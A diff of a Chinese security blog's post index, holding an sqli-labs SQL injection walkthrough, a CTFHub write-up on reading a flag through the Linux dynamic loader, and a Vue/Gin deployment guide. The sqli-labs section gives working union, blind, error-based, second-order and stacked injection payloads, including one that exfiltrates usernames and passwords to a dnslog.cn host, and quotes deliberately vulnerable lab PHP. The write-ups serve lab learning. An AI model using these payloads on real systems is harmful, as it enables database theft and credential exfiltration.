-RegExp 对象表示正则表达式，它是对字符串执行模式匹配的强大工具 正则表达式通常被用来检索、替换那些符合某个模式(规则)的文本。
-许多语言都有正则表达式
-物理也有正则
-所以正则是个啥(≧﹏ ≦)
-
-实操进阶
-有报错回显 无正确回显
-也就是说你在前四关能看见的绿字在 5-8 关用 you are in 替换了
-也就是你之前查的库名 表名 列名 和数据不会回显了
-当使用布尔盲注时 如果判断正确就会显示 you are in
-不正确的话就会报错
-下图是第五关第一个用户名 最后一步注入语句
-之前步骤参考第 1 到 4 关查各类信息的语句并用布尔盲注所用函数包装
-正确回显和报错回显都没有
-不论你输入啥，他都会说 you are in
-
-就像你说 啊对对对
-
-这样 布尔盲注也没法用了
-你不知道注入语句是对是错
-这时就要用时间盲注了
-把布尔盲注再进行包装
-if(布尔盲注语句,sleep(3),1)
-正确的话，浏览器会延时 3 秒再运行
-
-POST 传参
-先讲理论
-123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&#x3C;!--Form to post the data for sql injections Error based SQL Injection-->
-&#x3C;form action="" name="form1" method="post">
-	&#x3C;div style="margin-top:15px; height:30px;">Username : &#x26;nbsp;&#x26;nbsp;&#x26;nbsp;
-	    &#x3C;input type="text"  name="uname" value=""/>
-	&#x3C;/div>
-	&#x3C;div> Password  : &#x26;nbsp;&#x26;nbsp;&#x26;nbsp;
-		&#x3C;input type="text" name="passwd" value=""/>
-	&#x3C;/div>&#x3C;/br>
-	&#x3C;div style=" margin-top:9px;margin-left:90px;">
-		&#x3C;input type="submit" name="submit" value="Submit" />
-	&#x3C;/div>
-&#x3C;/form>
-        `上面是前端 通过post传参uname和passwd`
-&#x3C;?php
-// take the variables
-if(isset($_POST['uname']) &#x26;&#x26; isset($_POST['passwd']))
-{
-	$uname=$_POST['uname'];
-	$passwd=$_POST['passwd'];
-/后端接收前端传的参数
-	//logging the connection parameters to a file for analysis.
-	$fp=fopen('result.txt','a');
-	fwrite($fp,'User Name:'.$uname);
-	fwrite($fp,'Password:'.$passwd."\n");
-	fclose($fp);
-// connectivity
-	@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
-	$result=mysql_query($sql);
-	$row = mysql_fetch_array($result);
-
-	if($row)
-	{
-  		//echo '&#x3C;font color= "#0000ff">';
-  		echo "&#x3C;br>";
-		echo '&#x3C;font color= "#FFFF00" font size = 4>';
-		//echo " You Have successfully logged in\n\n " ;
-		echo '&#x3C;font size="3" color="#0000ff">';
-		echo "&#x3C;br>";
-		echo 'Your Login name:'. $row['username'];
-		echo "&#x3C;br>";
-		echo 'Your Password:' .$row['password'];
-		echo "&#x3C;br>";
-		echo "&#x3C;/font>";
-		echo "&#x3C;br>";
-		echo "&#x3C;br>";
-		echo '&#x3C;img src="../images/flag.jpg"  />';
-		/又是这里分成两部分，上面是正确回显
-		下面是报错回显
-		echo "&#x3C;/font>";
-  	}
-	else
-	{
-		echo '&#x3C;font color= "#0000ff" font size="3">';
-		//echo "Try again looser";
-		print_r(mysql_error());
-		echo "&#x3C;/br>";
-		echo "&#x3C;/br>";
-		echo "&#x3C;/br>";
-		echo '&#x3C;img src="../images/slap.jpg" />';
-		echo "&#x3C;/font>";
-	}
-}
-?>
-post传参
-post 传参有很多方式最本质的就是在输入框传
-然后是一些插件具有传参功能 hackbar 他们一般需要配合抓包的插件使用
-较多的是一些抓包软件，burpsuit 等
-他们既有抓包功能，也有重发器，测试器功能强大
-注入语句
-和 get 传参类型的语句大体相同，不同的地方有原来的 id=1’由于 get 传参，抓包后自动写入 uname/password=所以只需要写后面的 admin’ 加上 sql 执行语句，原理一样，都是让系统执行完传参后继续把 sql 语句执行来回显 这里末尾注释符可用#
-实操
-post 传参同样有三大类
-正误回显都有
-在 burpsuit 重发器里传参，
-
-红字部分即为注入语句，这里同样只展示最后一步 其他可按照 get 传参原理
-只需改动小部分
-没正确回显 有报错回显
-这里我采用了辨识度更高的时间盲注 布尔盲注同样使用
-正错回显都没有
-同上面直接时间盲注
-基于报错注入的各种传参方式
-先讲报错注入
-updatexml
-updatexml (XML_document, XPath_string, new_value)
-替换查找到的符合条件的数据
-extactvalue
-extractvalue(XML_document, XPath_string)
-对 XML 文档进行查询的函数
-当上述两个函数的 xpath 路径出错时，将 XML_document 报错返回回来
-注意只能返回 32 个字符，后面的可用 limit 等来限制返回的字符位置
-传参方式
-burp suite 抓包后改相应数据
-user-agent 注入
-1User-Agent:'or updatexml(1,concat(0x7e,(select database()),0x7e),1) or'
-referer 注入
-cookie 注入
-base64 加密的 cookie 注入
-将 payload 经 base64 加密后上传即可
-过滤注释的GET
-源码中过滤掉了注释符
-注释符不能用了所以要在闭合上下功夫
-12?id=' union select 1,group_concat(username),group_concat(password) from users where 1 or '1' = '1
-?id=-1' union select 1,(select group_concat(username) from users),'3
-在末尾构造语句使闭合符号与语句组成一个不影响的语句
-闭合方式多种多样
-二次注入
-首先注册一个用户 admin‘#
-然后登录
-修改密码
-当你修改密码时 后台就执行了
-1UPDATE users SET passwd="新密码" WHERE username =' admin' # ' AND password='
-也就是
-你用 admin’#用户把 admin 用户的密码给改了
-过滤
-过滤 or 和 and
-将 payload 里所有 and 和 or
-替换为 anandd 和 oorr
-这里 password 也要变成 passwoorrd
-1?id=-1 union select 1,2,group_concat(concat_ws(0x7e,username,passwoorrd)) from users#
-过滤下的报错注入
-26
-12345678$id= preg_replace('/or/i',"", $id);			/strip out OR (non case sensitive)
-	$id= preg_replace('/and/i',"", $id);		/Strip out AND (non case sensitive)
-	$id= preg_replace('/[\/\*]/',"", $id);		/strip out */
-	$id= preg_replace('/[--]/',"", $id);		/Strip out --
-	$id= preg_replace('/[#]/',"", $id);			/Strip out #
-	$id= preg_replace('/[\s]/',"", $id);		/Strip out spaces
-	$id= preg_replace('/[\/\\\\]/',"", $id);		/Strip out slashes
-	return $id;
-要用到||代替 or information 里的 or 要双写，用||‘1’=‘1 来闭合
-1?id=0'||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='security'))),1)||'1'='1
-
-27
-
-1?id=0'||updatexml(1,concat(0x7e,(SeLect(group_concat(table_name))from(information_schema.tables)where(table_schema='security'))),1)||'1'='1
-大小写 select 和 union
-过滤下的时间盲注
-26 到 27 关的 a 都是无法报错注入的
-能用时间盲注过滤方法和不带 a 的关一样
-waf
-12345678910111213141516171819202122232425262728293031323334/ take the variables
-if(isset($_GET['id'])){
-	$qs = $_SERVER['QUERY_STRING'];
-	$hint=$qs;
-	$id1=java_implimentation($qs);
-	$id=$_GET['id'];
-	//echo $id1;
-	whitelist($id1);}
-
-/WAF implimentation with a whitelist approach..... only allows input to be Numeric.
-function whitelist($input){
-	$match = preg_match("/^\d+$/", $input);
-	if($match)
-		{//echo "you are good";
-			//return $match;
-			}
-	else
-		{header('Location: hacked.php');
-			//echo "you are bad";
-			}
-}
-/ The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).
-function java_implimentation($query_string){
-	$q_s = $query_string;
-	$qs_array= explode("&#x26;",$q_s);
-	foreach($qs_array as $key => $value){
-		$val=substr($value,0,2);
-		if($val=="id"){
-			$id_value=substr($value,3,30);
-			return $id_value;
-			echo "&#x3C;br>";
-			break;}
-		}
-}
-java_implimentation 模拟 tomcat 的查询函数处理
-whitelist 白名单过滤 检测到不符合规则就重定向
-漏洞是 whitelist 只检测了 java_implimentation 输出的第一个参数$id_value
-后面的逃过检测 注入点在后面
-
-宽字节注入
-MySQL 在使用 GBK 编码的时候，会认为两个字符为一个汉字，因为过滤方法主要就是在敏感字符前面添加 反斜杠 \，所以这里想办法干掉反斜杠即可。
-urlencode(’) = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把%df%5c 当做是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。
-
-结束注释
-当转译为‘/时可用’/**/来结束注释
-堆叠注入
-在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。结束一个 sql 语句后继续构造下一条语句，会一起执行 因此产生了堆叠注入。而 union injection（联合注入）也是将两条语句合并在一起，两者之间区别在于 union 或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句
-堆叠注入为攻击者提供了很多的攻击手段，通过添加一个新 的查询或者终止查询，可以达到修改数据和调用存储过程的目的。这种技术在 SQL 注入中还是比较频繁的。
-如下展示了堆叠注入插入了一个用户数据
-同时也可以进行 dnslog 注入
-1?id=1';select load_file(concat('//',(select hex(concat_ws('~',username,password)) from users limit 0,1),'.au0mvd.dnslog.cn/1.txt'));--+
-
-123desc查看表结构的详细信息
-desc table_name;
-此处desc是describe的缩写，用法: desc 表名/查询语句
-handler 适用于 select 等过滤
-12345handler handler_table open;
-handler handler_table read first;
-handler handler_table read next;
-……
-handler handler_table close;
-二次注入进阶
-需成功登录才能二次注入
-12345678910111213141516171819202122232425262728293031323334353637383940414243444546function sqllogin($host,$dbuser,$dbpass, $dbname){
-   // connectivity
-//mysql connections for stacked query examples.
-$con1 = mysqli_connect($host,$dbuser,$dbpass, $dbname);
-
-   $username = mysqli_real_escape_string($con1, $_POST["login_user"]);
-   $password = $_POST["login_password"];
-
-   // Check connection
-   if (mysqli_connect_errno($con1))
-   {
-       echo "Failed to connect to MySQL: " . mysqli_connect_error();
-   }
-   else
-   {
-       @mysqli_select_db($con1, $dbname) or die ( "Unable to connect to the database ######: ");
-   }
- /* execute multi query */
- 	$sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
-   if (@mysqli_multi_query($con1, $sql))
-   {
-        /* store first result set */
-      if($result = @mysqli_store_result($con1))
-      {
-	 if($row = @mysqli_fetch_row($result)){
-	    if ($row[1]) {
-	       return $row[1];
-	    }
-	    else{
-	       return 0;
-	    }
-	 }
-      }
-
-      else  {
-	echo '&#x3C;font size="5" color= "#FFFF00">';
-	print_r(mysqli_error($con1));
-	echo "&#x3C;/font>";
-      }
-   }
-   else
-   {
-	echo '&#x3C;font size="5" color= "#FFFF00">';
-	print_r(mysqli_error($con1));
-	echo "&#x3C;/font>";
-    }
-这里对 username 和 password 过滤不强
-可通过万能密码
-11’ or '1'='1
-登录
-接下来通过修改密码界面二次注入
-12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&#x3C;?PHP
-session_start();
-if (!isset($_COOKIE["Auth"])){
-	if (!isset($_SESSION["username"])) {
-  		header('Location: index.php');
-	}
-	header('Location: index.php');
-}
-?>
-&#x3C;?php
-//including the Mysql connect parameters.
-include("../sql-connections/sql-connect.php");
-if (isset($_POST['submit'])){
-	# Validating the user input........
-	$username= $_SESSION["username"];
-	$curr_pass= mysql_real_escape_string($_POST['current_password']);//原密码 还是万能密码绕过
-	$pass= mysql_real_escape_string($_POST['password']);//新密码
-	$re_pass= mysql_real_escape_string($_POST['re_password']);
-	if($pass==$re_pass){
-		$sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
-		$res = mysql_query($sql) or die('You tried to be smart, Try harder!!!! :( ');
-		$row = mysql_affected_rows();
-		echo '&#x3C;font size="3" color="#FFFF00">';
-		echo '&#x3C;center>';
-		if($row==1){
-			//echo "Password successfully updated";
-			echo '&#x3C;img src="../images/password-updated.jpg">';
-			}
-		else{
-			header('Location: failed.php');
-			//echo 'You tried to be smart, Try harder!!!! :( ';
-
-		}
-	}
-	else{
-		echo '&#x3C;font size="5" color="#FFFF00">&#x3C;center>';
-		echo "Make sure New Password and Retype Password fields have same value";
-		header('refresh:2, url=index.php');
-	}
-}
-?>
-&#x3C;?php
-if(isset($_POST['submit1']))
-{
-	session_destroy();
-	setcookie('Auth', 1 , time()-3600);
-	header ('Location: index.php');
-}
-?>
-他用户名通过 session 获取，所以无法更改其他用户
-order by注入
-1SELECT * FROM users ORDER BY
-order by 与 where 差不多
-但不同是 order by 不能使用 union 联合
-其他都可 也比较灵活
-从 46 到 53 关皆为 order by 注入
-限制次数的注入
-从 54 关开始，限制了注入次数
-一旦超过次数就会改变数据
-一切又要重新开始
-
-
-
-58-62 可以报错注入
-从 62 关开始只能使用盲注
-id注入部分代码
-12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182&#x3C;?php
-id注入部分代码
-//including the Mysql connect parameters.
-include '../sql-connections/sql-connect-1.php';
-include '../sql-connections/functions.php';
-error_reporting(0);
-$pag = $_SERVER['PHP_SELF']; /generating page address to piggy back after redirects...
-$characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; /characterset for generating random data
-$times= 10;
-$table = table_name();
-$col = column_name(1);     / session id column name
-$col1 = column_name(2);   /secret key column name
-/ Submitting the final answer
-if(!isset($_POST['answer_key'])){
-	/ resetting the challenge and repopulating the table .
-	if(isset($_POST['reset'])){
-		setcookie('challenge', ' ', time() - 3600000);
-		echo "&#x3C;font size=4>You have reset the Challenge&#x3C;/font>&#x3C;br>\n";
-		echo "Redirecting you to main challenge page..........\n";
-		header( "refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag" );
-		//echo "cookie expired";
-
-	}
-	else{
-		/ Checking the cookie on the page and populate the table with random value.
-		if(isset($_COOKIE['challenge'])){
-			$sessid=$_COOKIE['challenge'];
-			//echo "Cookie value: ".$sessid;
-		}
-		else{
-			$expire = time()+60*60*24*30;
-			$hash = data($table,$col);
-			setcookie("challenge", $hash, $expire);
-
-		}
-
-		echo "&#x3C;br>\n";
-		/take the variables
-		if(isset($_GET['id'])){
-			$id=$_GET['id'];
-			/logging the connection parameters to a file for analysis.
-			$fp=fopen('result.txt','a');
-			fwrite($fp,'ID:'.$id."\n");
-			fclose($fp);
-			/update the counter in database
-			next_tryy();
-			/Display attempts on screen.
-			$tryyy = view_attempts();
-			echo "You have made : ". $tryyy ." of $times attempts";
-			echo "&#x3C;br>&#x3C;br>&#x3C;br>\n";
-		  /Reset the Database if you exceed allowed attempts.
-			if($tryyy >= ($times+1)){
-				setcookie('challenge', ' ', time() - 3600000);
-				echo "&#x3C;font size=4>You have exceeded maximum allowed attempts, Hence Challenge Has Been Reset &#x3C;/font>&#x3C;br>\n";
-				echo "Redirecting you to challenge page..........\n";
-				header( "refresh:3;url=../sql-connections/setup-db-challenge.php?id=$pag" );
-				echo "&#x3C;br>\n";
-			}
-		/ Querry DB to get the correct output
-			$sql="SELECT * FROM security.users WHERE id='$id' LIMIT 0,1";
-			$result=mysql_query($sql);
-			$row = mysql_fetch_array($result);
-			if($row){
-				echo '&#x3C;font color= "#00FFFF">';
-				echo 'Your Login name:'. $row['username'];
-				echo "&#x3C;br>";
-				echo 'Your Password:' .$row['password'];
-				echo "&#x3C;/font>";
-			}
-			else {
-				echo '&#x3C;font color= "#FFFF00">';
-//				print_r(mysql_error());
-				echo "&#x3C;/font>";
-			}
-		}
-		else{
-			echo "Please input the ID as parameter with numeric value as done in  Lab excercises\n&#x3C;br>&#x3C;br>\n&#x3C;/font>";
-			echo "&#x3C;font color='#00FFFF': size=3>The objective of this challenge is to dump the &#x3C;b>(secret key)&#x3C;/b> from only random table from Database &#x3C;b>&#x3C;i>('CHALLENGES')&#x3C;/i>&#x3C;/b> in Less than $times attempts&#x3C;br>";
-			echo "For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.&#x3C;br>" ;
-		}
-	}
-}
-答案提交部分
-1234567891011121314151617181920212223242526272829else
-{
-	echo '&#x3C;div  style=" color:#00FFFF; font-size:18px; text-align:center">';
-	$key = addslashes($_POST['key']);
-	$key = mysql_real_escape_string($key);
-	//echo $key;
-	/Query table to verify your result
-	$sql="SELECT 1 FROM $table WHERE $col1= '$key'";
-	//echo "$sql";
-	$result=mysql_query($sql)or die("error in submittion of Key Solution".mysql_error());
-	$row = mysql_fetch_array($result);
-	if($row)
-	{
-		echo '&#x3C;font color= "#FFFF00">';
-		echo "\n&#x3C;br>&#x3C;br>&#x3C;br>";
-		echo '&#x3C;img src="../images/Less-54-1.jpg" />';
-		echo "&#x3C;/font>";
-		header( "refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag" );
-	}
-	else {
-		echo '&#x3C;font color= "#FFFF00">';
-		echo "\n&#x3C;br>&#x3C;br>&#x3C;br>";
-		echo '&#x3C;img src="../images/slap1.jpg" />';
-		header( "refresh:3;url=index.php" );
-		//print_r(mysql_error());
-		echo "&#x3C;/font>";
-		}
-}
-?>]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>sql</tag>
-        <tag>sqli-lab</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>vue gin合并部署(完美方案)</title>
-    <url>/2024/12/vue%20gin%E5%90%88%E5%B9%B6%E9%83%A8%E7%BD%B2/</url>
-    <content><![CDATA[简介
-目前 vue 与 gin 的项目基本都是前后端分离部署
-二者合并部署的教程非常少，且各有各的问题
-结合各个教程后 找到一种比较完美的合并部署方案
-vue
-使用 axios 时进行如下配置
-12345const request = axios.create({
-  baseURL: `${currentDomain}/api`,
-  timeout: 5000,
-  headers: { "Cache-Control": "no-cache" },
-});
-对 baseURL 进行设置是为了能够使用户请求时，前后端的域名端口完全一致，避免造成跨域（必须）
-并且对于非域名部署的情况，能够方便地动态调整，避免写死 baseURL
-headers 的设置是为了 vue dev 环境下，前后端的联调
-同时
-为了 dev 联调避免出现跨域问题，还应添加代理
-1234567891011121314export default defineConfig({
-  // 其他参数
-  server: {
-    // port: 8080,
-    // open: true,
-    proxy: {
-      "/api": {
-        target: "http://localhost:5731",
-        changeOrigin: true,
-        // rewrite: (path) => path.replace(/^\/api/, ""), // 移除 /api 前缀 根据前后端代码 自行修改
-      },
-    },
-  },
-});
-额外配置 build 后任务，将构建好的 dist 复制到后端目录下
-12345"scripts": {
-    "dev": "vite",
-    "build": "vite build &#x26;&#x26; robocopy ./dist 后端路径/vue /e /z /r:0",
-    "preview": "vite preview"
-  },
-方便一部送到位
-gin
-12345678❯ tree
-文件夹 PATH 列表
-卷序列号为 AE05-588D
-C:.
-├─main.go
-├─其他
-└─vue /* 可改 */
-    └─assets
-main.go 添加 embed 和路由
-12345678910111213141516171819202122232425262728//go:embed  vue/index.html
-var indexHtml []byte
-
-//go:embed  vue/*
-var vue embed.FS
-
-func main() {
-	// 其他设置
-
-    // 配置允许跨域 方便dev联调
-	r.Use(cors.New(cors.Config{
-		AllowOrigins:     []string{"*"}, // 允许的域名
-		AllowMethods:     []string{"GET", "POST", "PUT", "DELETE"},
-		AllowHeaders:     []string{"Origin", "Content-Type", "Authorization", "Cache-Control"},
-		AllowCredentials: true,
-	}))
-
-	// 配置vue路由
-	assets, _ := fs.Sub(vue, "vue/assets")
-	r.StaticFS("/assets", http.FS(assets))
-	icon, _ := fs.ReadFile(vue, "vue/favicon.ico")
-	r.GET("/favicon.ico", func(c *gin.Context) { c.Data(200, "image/x-icon", icon) })
-	r.NoRoute(func(c *gin.Context) {
-		c.Data(200, "text/html; charset=utf-8", indexHtml)
-	})
-
-    // 其他路由
-}
-使用r.NoRoute将非后端路由全部导向 index.html，并由 index.html 获取 css、js 等
-vue 中设置的 router 会被 build 进 js
-通过 js 获取 url 来切换页面
-对未使用 embed 的方法同理，参考代码自行设置
-embed
-对于使用embed的
-由于StaticFS和embed的底层代码逻辑
-
-在前端根目录的文件一般不多，这里只有index.html和 icon 文件
-
-可通过单独获取、或通过fs.ReadFile获取，分别参考index.html和favicon.ico
-对于前端其他文件，需要通过fs.Sub下移到对应目录后才能通过r.StaticFS(&quot;/assets&quot;, http.FS(assets))配置路由，且前端文件夹名和后端路由必须相同，二者缺一不可，否则会出现空白页面，即请求 js 等文件不存在的，页面无法加载等情况
-]]></content>
-      <categories>
-        <category>教程</category>
-      </categories>
-      <tags>
-        <tag>vue</tag>
-        <tag>gin</tag>
-        <tag>golang</tag>
+        <tag>git</tag>
       </tags>
   </entry>
   <entry>
@@ -3457,6 +2591,66 @@ Next
         <tag>awd</tag>
         <tag>AoiAWD</tag>
         <tag>反制脚本</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>linux动态加载</title>
+    <url>/2022/05/linux%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/</url>
+    <content><![CDATA[linux 动态加载
+查看环境
+先给了 755
+他自己传了 flag 等于告诉我们在哪了
+然后限到了 644
+不想让我们直接看
+
+都到这一题了权限应该不用讲了
+
+提示给了 shell
+且不需要提权
+
+于是需要新学一个东西
+动态加载
+Linux ELF Dynaamic Loader
+elf 文件
+elf 文件是 linux 下的可执行文件
+文件头为 elf
+
+不知道是靶机还是蚁剑虚拟终端的问题 没法 vi
+直接 cat 就能看到了
+
+
+动态库链接器/加载器
+
+当需要动态链接的应用被操作系统加载时
+系统必须要定位然后加载它所需要的所有动态库文件
+在 Linux 环境下，这项工作是由 ld-linux.so.2 来负责完成的
+执行操作时操作系统会将控制权交给 ld-linux.so
+而不是交给程序正常的进入地址
+ld-linux.so.2 会寻找然后加载所有需要的库文件，然后再将控制权交给应用的起始入口。
+
+ldd 命令
+使用 ldd 命令即可查看
+简便的 shell 命令依赖哪些动态加载库
+
+姿势
+在 cat elf 文件时
+看到第一行后面/lib64/ld-linux-x86-64.so.2 动态库
+并且在 ldd
+可以看到 ls 和 cat 动用他了
+用！
+这是他的介绍
+执行
+1/lib64/ld-linux-x86-64.so.2 /readflag
+get
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctfhub</tag>
+        <tag>linux</tag>
+        <tag>动态加载</tag>
       </tags>
   </entry>
   <entry>
@@ -4095,6 +3289,812 @@ Content-Disposition: form-data; name="submit"
         <tag>web</tag>
         <tag>upload</tag>
         <tag>upload-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vue gin合并部署(完美方案)</title>
+    <url>/2024/12/vue%20gin%E5%90%88%E5%B9%B6%E9%83%A8%E7%BD%B2/</url>
+    <content><![CDATA[简介
+目前 vue 与 gin 的项目基本都是前后端分离部署
+二者合并部署的教程非常少，且各有各的问题
+结合各个教程后 找到一种比较完美的合并部署方案
+vue
+使用 axios 时进行如下配置
+12345const request = axios.create({
+  baseURL: `${currentDomain}/api`,
+  timeout: 5000,
+  headers: { "Cache-Control": "no-cache" },
+});
+对 baseURL 进行设置是为了能够使用户请求时，前后端的域名端口完全一致，避免造成跨域（必须）
+并且对于非域名部署的情况，能够方便地动态调整，避免写死 baseURL
+headers 的设置是为了 vue dev 环境下，前后端的联调
+同时
+为了 dev 联调避免出现跨域问题，还应添加代理
+1234567891011121314export default defineConfig({
+  // 其他参数
+  server: {
+    // port: 8080,
+    // open: true,
+    proxy: {
+      "/api": {
+        target: "http://localhost:5731",
+        changeOrigin: true,
+        // rewrite: (path) => path.replace(/^\/api/, ""), // 移除 /api 前缀 根据前后端代码 自行修改
+      },
+    },
+  },
+});
+额外配置 build 后任务，将构建好的 dist 复制到后端目录下
+12345"scripts": {
+    "dev": "vite",
+    "build": "vite build &#x26;&#x26; robocopy ./dist 后端路径/vue /e /z /r:0",
+    "preview": "vite preview"
+  },
+方便一部送到位
+gin
+12345678❯ tree
+文件夹 PATH 列表
+卷序列号为 AE05-588D
+C:.
+├─main.go
+├─其他
+└─vue /* 可改 */
+    └─assets
+main.go 添加 embed 和路由
+12345678910111213141516171819202122232425262728//go:embed  vue/index.html
+var indexHtml []byte
+
+//go:embed  vue/*
+var vue embed.FS
+
+func main() {
+	// 其他设置
+
+    // 配置允许跨域 方便dev联调
+	r.Use(cors.New(cors.Config{
+		AllowOrigins:     []string{"*"}, // 允许的域名
+		AllowMethods:     []string{"GET", "POST", "PUT", "DELETE"},
+		AllowHeaders:     []string{"Origin", "Content-Type", "Authorization", "Cache-Control"},
+		AllowCredentials: true,
+	}))
+
+	// 配置vue路由
+	assets, _ := fs.Sub(vue, "vue/assets")
+	r.StaticFS("/assets", http.FS(assets))
+	icon, _ := fs.ReadFile(vue, "vue/favicon.ico")
+	r.GET("/favicon.ico", func(c *gin.Context) { c.Data(200, "image/x-icon", icon) })
+	r.NoRoute(func(c *gin.Context) {
+		c.Data(200, "text/html; charset=utf-8", indexHtml)
+	})
+
+    // 其他路由
+}
+使用r.NoRoute将非后端路由全部导向 index.html，并由 index.html 获取 css、js 等
+vue 中设置的 router 会被 build 进 js
+通过 js 获取 url 来切换页面
+对未使用 embed 的方法同理，参考代码自行设置
+embed
+对于使用embed的
+由于StaticFS和embed的底层代码逻辑
+
+在前端根目录的文件一般不多，这里只有index.html和 icon 文件
+
+可通过单独获取、或通过fs.ReadFile获取，分别参考index.html和favicon.ico
+对于前端其他文件，需要通过fs.Sub下移到对应目录后才能通过r.StaticFS(&quot;/assets&quot;, http.FS(assets))配置路由，且前端文件夹名和后端路由必须相同，二者缺一不可，否则会出现空白页面，即请求 js 等文件不存在的，页面无法加载等情况
+]]></content>
+      <categories>
+        <category>教程</category>
+      </categories>
+      <tags>
+        <tag>vue</tag>
+        <tag>gin</tag>
+        <tag>golang</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-lab</title>
+    <url>/2022/02/sqli-lab/</url>
+    <content><![CDATA[sql 注入就是
+当用户输入一些本不是用户名密码的 sql 语句
+这些语句没有被过滤
+执行后通过回显等方式，使注入者获得了数据库的信息
+
+水了几天用来搞 visual studio2022 和 Windows11 所以本文略微简陋写，以后会完善
+visual studio2022 版美化教程见Visual Studio 2022 界面美化教程.
+
+GET 传参
+先放代码
+1234567891011121314151617181920212223242526272829303132333435363738394041424344&#x3C;?php
+//including the Mysql connect parameters.
+include("../sql-connections/sql-connect.php");
+error_reporting(0);
+// take the variables
+if(isset($_GET['id']))
+{
+$id=$_GET['id'];
+//logging the connection parameters to a file for analysis.
+$fp=fopen('result.txt','a');
+fwrite($fp,'ID:'.$id."\n");
+fclose($fp);
+// connectivity
+//注意get传参
+获取到输入的id后先打开一个result.txt然后把你上传的写入到那个文件里
+这样你再一次操作后你就可以看到你的注入语句真正注进去的是啥了
+$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+//上面一行中$id前后的符号是关键，是注入语句闭合的符号
+$result=mysql_query($sql);
+$row = mysql_fetch_array($result);
+
+	if($row)
+	{
+	  	echo "&#x3C;font size='5' color= '#99FF00'>";//正确回显颜色为绿色
+	  	echo 'Your Login name:'. $row['username'];
+	  	echo "&#x3C;br>";
+	  	echo 'Your Password:' .$row['password'];
+	  	echo "&#x3C;/font>";
+  	}
+  	//这是输入正确时的反馈，直接把运行结果告诉你
+    但是后几关就不一样了
+	else
+	{
+		echo '&#x3C;font color= "#FFFF00">';//报错回显为黄色
+		print_r(mysql_error());
+		echo "&#x3C;/font>";
+	}
+	//这是输入错误时的反馈，把mysql_error反馈给你
+    同样，后几关也不一样了
+}
+	else { echo "Please input the ID as parameter with numeric value";}
+//这是反馈你输入为空的
+
+?>
+/* *我为了让读者能看得更清晰，我将注释符的右半部分删去，就像这句一样没有* */（你细品这句话 悖论）
+我第一个注释是：注意 get 传参，前 10 关前半部分代码不变
+第二个注释是提示读者要注意每一关的闭合方式（包裹方式）
+在 if 后 else 前是正确回显部分 在 else 后是错误回显部分
+这两部分是区分注入方式所需要关注的
+先讲理论
+根据两部分分别是否回显判断注入方式
+注入方式包含联合查询、布尔盲注、时间盲注、报错注入等
+传参
+最基础的就是?id=1’、username=admin’这类传参语句，后面的’引号是闭合方式上面有讲，他用的啥符号闭合，你就要用相同的符号来闭合你的语句，输入这类最基础的注入语句来判断是否有报错回显 回显是黄色，代码段注释里有写
+判断正确回显（绿色）的数据库中数据的列数，即本靶场回显的行数
+1?id=1’ order by 1--+
+这里的省略号只要不报错 就加大数字，直到报错的前一个数字，就是回显的行数
+判断回显的数据是数据库中的哪几列
+1?id=-1’ union select 1,2,3--+
+这里的数字的最大值要等与上一步得到的那个数
+上一步 7 报错，那行数就是 6，这一步就要 1，2，3，4，5，6–+
+看看那几个数字出现在你屏幕上了
+要注意要 id=一个不正确的值 如 0，-1 之类 这样联合查询之后的返回值会让 union 之后的查询语句的结果在数组的第一列，而后台 php 代码只会回显第一列的数据
+查库名
+1?id=-1’ union select 1,2,group_concat(schema_name) from information_schema.schemata --+
+这里把查数据库的 sql 语句，替换掉出现在你屏幕上的一个数字 这里是 3 来回显在屏幕上
+group_concat(你要查询的数据）from 所在的库 表 列
+这里查库名即查schema_name 这个数据被保存在information_schema.schemata
+这样 回显的就是 数据库们 的名字
+查表名
+1?id=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=‘security’–+
+table 表 information_schema.tables 类比上面 table_schema=‘ 库名’
+这里你要猜一下哪个数据库会放着你想要的数据，然后输在库名那个位置
+查列名
+1?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=‘users’--+
+同样类比上面 column 列
+这里还要猜 上面回显的哪个表里有你要的数据
+提取数据
+激动人心的时候到了
+1?id=-1’ union select 1,2,group_concat(concat_ws(’~’,username,password)) from users–+
+同样类比上面 有一处特殊 concat_ws(符号，列名，列名）
+中间那个符号会被 concat_ws 插入到两组数据之间，就是为了方便看
+这样就查到数据了，是不是很简单。
+limit
+limit 是限制那一部分显示，limitx，y 是从 x+1 开始显示 y 个
+实操
+正错回显都有
+就按上面的步骤一步一步找到数据
+security———&gt;users——&gt;username&amp;password 这就是靶场数据库的层次
+图啥的以后再补
+理论进阶
+时间盲注
+12?id=1’ and sleep (5)–+
+?id=1‘ and if((left((select schema_name from information_schema.schemata limit 4,1),1,1)=‘s’),1,sleep(3))–+
+这样的句子 sleep()就是延时执行的意思，
+
+让浏览器先睡一会
